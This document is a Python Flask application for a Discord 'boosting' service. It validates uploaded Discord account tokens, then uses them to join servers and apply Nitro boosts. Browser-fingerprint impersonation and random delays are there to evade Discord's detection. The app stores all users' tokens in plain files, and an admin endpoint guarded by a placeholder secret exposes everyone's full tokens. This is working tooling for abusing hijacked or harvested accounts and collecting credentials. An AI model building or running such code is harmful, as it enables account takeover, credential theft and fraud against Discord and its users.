from flask import Flask, render_template, request, jsonify
import requests
import json
import os
import time
import hashlib
import random
from datetime import datetime

# Try to import curl_cffi for stealth boosting only
try:
    from curl_cffi import requests as curl_requests
    STEALTH_AVAILABLE = True
    print("[✓] curl_cffi loaded - Stealth boosting ENABLED")
except ImportError:
    STEALTH_AVAILABLE = False
    print("[!] curl_cffi not found - Install with: pip install curl_cffi")

app = Flask(__name__)

# ==================== STORAGE SETUP ====================
DOWNLOADS_PATH = "/storage/emulated/0/Download"
TOKENS_DIR = os.path.join(DOWNLOADS_PATH, "discord_booster_tokens")
UPLOADS_DIR = os.path.join(DOWNLOADS_PATH, "discord_booster_uploads")
BOOSTED_FILE = os.path.join(DOWNLOADS_PATH, "boosted_servers.json")

os.makedirs(TOKENS_DIR, exist_ok=True)
os.makedirs(UPLOADS_DIR, exist_ok=True)

print(f"📁 Tokens saved to: {TOKENS_DIR}")

# ==================== TOKEN CHECKER (YOUR WORKING VERSION - NO CHANGES) ====================
def check_token(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
        if r.status_code != 200:
            return {"valid": False, "error": f"Status {r.status_code}"}
        
        user_data = r.json()
        
        r_subs = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers, timeout=10)
        subscriptions = r_subs.json() if r_subs.status_code == 200 else []
        
        nitro = "No Nitro"
        nitro_days = 0
        for sub in subscriptions:
            sku = str(sub.get("sku_id", ""))
            if "521846918637420545" in sku or "premium" in str(sub.get("subscription_plan", {})):
                try:
                    end = sub["current_period_end"]
                    nitro_days = int((time.mktime(time.strptime(end, "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400)
                    nitro = f"Nitro Premium ({nitro_days}d left)"
                except:
                    nitro = "Nitro Premium"
            elif "511651871736201216" in sku or "basic" in str(sub.get("subscription_plan", {})):
                try:
                    end = sub["current_period_end"]
                    nitro_days = int((time.mktime(time.strptime(end, "%Y-%m-%dT%H:%M:%S.%f%z")) - time.time()) / 86400)
                    nitro = f"Nitro Basic ({nitro_days}d left)"
                except:
                    nitro = "Nitro Basic"
        
        r_boosts = requests.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=10)
        boosts = 0
        if r_boosts.status_code == 200:
            boost_slots = r_boosts.json()
            boosts = sum(1 for s in boost_slots if s.get("cooldown_ends_at") is None)
        
        return {
            "valid": True,
            "username": user_data.get("username", "Unknown"),
            "nitro": nitro,
            "nitro_days": nitro_days,
            "boosts": boosts,
            "user_id": user_data.get("id")
        }
    except Exception as e:
        return {"valid": False, "error": str(e)[:50]}

# ==================== USER TOKEN STORAGE ====================
def get_user_file(username):
    safe_name = hashlib.md5(username.encode()).hexdigest()[:16]
    return os.path.join(TOKENS_DIR, f"{safe_name}_{username}.txt")

def load_user_tokens(username):
    filepath = get_user_file(username)
    if not os.path.exists(filepath):
        return []
    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def save_user_tokens(username, tokens):
    filepath = get_user_file(username)
    with open(filepath, "w") as f:
        f.write("\n".join(tokens))
    print(f"[✓] Saved {len(tokens)} tokens for {username}")

# ==================== STEALTH BOOST FUNCTIONS (USING curl_cffi) ====================
def get_stealth_session():
    """Create a stealth session with browser fingerprint"""
    if STEALTH_AVAILABLE:
        # Rotate between different browser fingerprints
        browsers = ["chrome120", "chrome119", "chrome118", "firefox120"]
        return curl_requests.Session(impersonate=random.choice(browsers))
    else:
        return requests.Session()

def get_stealth_headers():
    """Generate realistic browser headers for boosting"""
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/channels/@me",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": '"Windows"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }

def get_available_boost_slots_stealth(token):
    """Get available boost slot IDs using stealth session"""
    headers = get_stealth_headers()
    headers["Authorization"] = token
    try:
        session = get_stealth_session()
        r = session.get("https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots", headers=headers, timeout=15)
        if r.status_code == 200:
            slots = r.json()
            available_slots = [s.get("id") for s in slots if s.get("cooldown_ends_at") is None]
            return available_slots
    except Exception as e:
        print(f"[DEBUG] Get slots error: {e}")
    return []

def join_server_stealth(token, invite_code):
    """Join a server using stealth session"""
    headers = get_stealth_headers()
    headers["Authorization"] = token
    url = f"https://discord.com/api/v9/invites/{invite_code}"
    try:
        session = get_stealth_session()
        time.sleep(random.uniform(0.5, 1.5))
        r = session.post(url, headers=headers, json={}, timeout=15)
        return r.status_code == 200
    except:
        return False

def get_guild_id_stealth(invite_code):
    """Get guild ID using stealth session"""
    try:
        session = get_stealth_session()
        r = session.get(f"https://discord.com/api/v9/invites/{invite_code}", timeout=10)
        if r.status_code == 200:
            return r.json().get("guild", {}).get("id")
    except:
        pass
    return None

def apply_boost_stealth(token, guild_id, slot_id):
    """Apply a boost using stealth session - CORRECT FORMAT"""
    headers = get_stealth_headers()
    headers["Authorization"] = token
    url = f"https://discord.com/api/v9/guilds/{guild_id}/premium/subscriptions"
    payload = {"user_premium_guild_subscription_slot_ids": [slot_id]}
    
    try:
        session = get_stealth_session()
        time.sleep(random.uniform(1, 2))
        r = session.post(url, headers=headers, json=payload, timeout=15)
        return r.status_code in [200, 201]
    except:
        return False

def perform_boosts_stealth(token, guild_id, boost_count):
    """Apply multiple boosts using stealth session"""
    available_slots = get_available_boost_slots_stealth(token)
    
    if not available_slots:
        return 0
    
    boosts_applied = 0
    slots_to_use = available_slots[:boost_count]
    
    for slot_id in slots_to_use:
        if apply_boost_stealth(token, guild_id, slot_id):
            boosts_applied += 1
        time.sleep(random.uniform(2, 3))
    
    return boosts_applied

# ==================== ADMIN PANEL (YOUR ORIGINAL) ====================
@app.route('/api/admin/tokens', methods=['GET'])
def admin_tokens():
    """ADMIN PANEL - View all tokens from all users"""
    secret = request.args.get('secret', '')
    
    # CHANGE THIS TO YOUR OWN SECRET KEY!
    ADMIN_SECRET = "your_admin_secret_here_123"
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized", "message": "Invalid admin secret"}), 401
    
    all_users = {}
    total_tokens = 0
    
    for filename in os.listdir(TOKENS_DIR):
        if filename.endswith('.txt'):
            filepath = os.path.join(TOKENS_DIR, filename)
            with open(filepath, 'r') as f:
                tokens = [line.strip() for line in f if line.strip()]
                total_tokens += len(tokens)
                
                # Get username from filename
                username = filename.split('_', 1)[-1].replace('.txt', '')
                all_users[username] = {
                    "file": filename,
                    "count": len(tokens),
                    "tokens": tokens[:10]
                }
    
    return jsonify({
        "status": "success",
        "total_users": len(all_users),
        "total_tokens": total_tokens,
        "users": all_users,
        "stealth_available": STEALTH_AVAILABLE
    })

@app.route('/api/admin/tokens/<username>', methods=['GET'])
def admin_user_tokens(username):
    """ADMIN PANEL - View tokens for specific user"""
    secret = request.args.get('secret', '')
    ADMIN_SECRET = "your_admin_secret_here_123"
    
    if secret != ADMIN_SECRET:
        return jsonify({"error": "Unauthorized"}), 401
    
    tokens = load_user_tokens(username)
    return jsonify({
        "username": username,
        "count": len(tokens),
        "tokens": tokens
    })

# ==================== MAIN ROUTES ====================
@app.route('/')
def dashboard():
    user = request.args.get('user', 'default')
    return render_template('dashboard.html', user=user)

@app.route('/api/tokens', methods=['GET'])
def get_tokens():
    user = request.args.get('user', 'default')
    all_tokens = load_user_tokens(user)
    results = []
    for token in all_tokens:
        info = check_token(token)
        results.append({
            "token": token[:20] + "..." if len(token) > 20 else token,
            "full_token": token,
            **info
        })
    return jsonify(results)

@app.route('/api/tokens/add', methods=['POST'])
def add_token():
    data = request.json
    user = data.get('user', 'default')
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({"error": "No token"})
    
    tokens = load_user_tokens(user)
    info = check_token(token)
    
    if info['valid']:
        if token not in tokens:
            tokens.append(token)
            save_user_tokens(user, tokens)
            return jsonify({"status": "ok", "username": info['username']})
        else:
            return jsonify({"status": "exists"})
    else:
        return jsonify({"status": "invalid", "error": info.get('error', 'Invalid token')})

@app.route('/api/tokens/remove', methods=['POST'])
def remove_token():
    data = request.json
    user = data.get('user', 'default')
    token = data.get('token', '')
    
    tokens = load_user_tokens(user)
    tokens = [t for t in tokens if t != token]
    save_user_tokens(user, tokens)
    
    return jsonify({"status": "ok"})

@app.route('/api/upload', methods=['POST'])
def upload_file():
    user = request.form.get('user', 'default')
    file = request.files.get('file')
    
    if not file:
        return jsonify({"error": "No file"})
    
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{user}_{timestamp}_{file.filename}"
    filepath = os.path.join(UPLOADS_DIR, filename)
    file.save(filepath)
    
    try:
        content = open(filepath, 'r').read()
        
        if content.strip().startswith('['):
            tokens_data = json.loads(content)
            tokens = tokens_data if isinstance(tokens_data, list) else []
        else:
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
        
        existing_tokens = load_user_tokens(user)
        added = 0
        
        for token in tokens:
            if token and token not in existing_tokens:
                info = check_token(token)
                if info['valid']:
                    existing_tokens.append(token)
                    added += 1
        
        if added > 0:
            save_user_tokens(user, existing_tokens)
        
        return jsonify({"status": "ok", "tokens_added": added})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/boost/start', methods=['POST'])
def start_boost():
    data = request.json
    user = data.get('user', 'default')
    invite = data.get('invite', '').strip()
    
    if "discord.gg/" in invite:
        invite = invite.split("discord.gg/")[-1].split("/")[0]
    
    target = int(data.get('target_boosts', 1))
    all_tokens = load_user_tokens(user)
    
    if not all_tokens:
        return jsonify({"error": "No tokens found"})
    
    # Find valid tokens with boosts
    valid_tokens = []
    for token in all_tokens:
        info = check_token(token)
        if info['valid'] and info['boosts'] > 0:
            valid_tokens.append({'token': token, 'username': info['username'], 'boosts': info['boosts']})
    
    if not valid_tokens:
        return jsonify({"error": "No tokens with boosts available"})
    
    total_boosts = sum(t['boosts'] for t in valid_tokens)
    if total_boosts < target:
        return jsonify({"error": f"Need {target} boosts, have {total_boosts}"})
    
    # Process boosts using stealth
    boosts_done = 0
    results = []
    
    for vt in valid_tokens:
        if boosts_done >= target:
            break
        to_apply = min(vt['boosts'], target - boosts_done)
        
        guild_id = get_guild_id_stealth(invite)
        if not guild_id:
            return jsonify({"error": "Invalid invite code"})
        
        if not join_server_stealth(vt['token'], invite):
            results.append({"username": vt['username'], "error": "Failed to join"})
            continue
        
        applied = perform_boosts_stealth(vt['token'], guild_id, to_apply)
        boosts_done += applied
        results.append({"username": vt['username'], "applied": applied})
        time.sleep(random.uniform(2, 4))
    
    # Save history
    history = []
    if os.path.exists(BOOSTED_FILE):
        with open(BOOSTED_FILE, 'r') as f:
            history = json.load(f)
    
    history.append({
        "user": user,
        "invite": invite,
        "target": target,
        "applied": boosts_done,
        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
        "stealth_used": STEALTH_AVAILABLE,
        "results": results
    })
    
    with open(BOOSTED_FILE, 'w') as f:
        json.dump(history[-100:], f, indent=2)
    
    return jsonify({"status": "done", "applied": boosts_done, "results": results})

@app.route('/api/check_token', methods=['POST'])
def check_token_endpoint():
    data = request.json
    token = data.get('token', '')
    result = check_token(token)
    return jsonify(result)

@app.route('/api/history', methods=['GET'])
def get_history():
    user = request.args.get('user', 'default')
    if not os.path.exists(BOOSTED_FILE):
        return jsonify([])
    with open(BOOSTED_FILE, 'r') as f:
        history = json.load(f)
        user_history = [h for h in history if h.get('user') == user]
        return jsonify(user_history)

@app.route('/debug/path', methods=['GET'])
def debug_path():
    return jsonify({
        "tokens_dir": TOKENS_DIR,
        "exists": os.path.exists(TOKENS_DIR),
        "files": os.listdir(TOKENS_DIR) if os.path.exists(TOKENS_DIR) else [],
        "stealth_available": STEALTH_AVAILABLE
    })

@app.route('/health')
def health():
    return jsonify({"status": "alive", "time": datetime.now().isoformat()})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
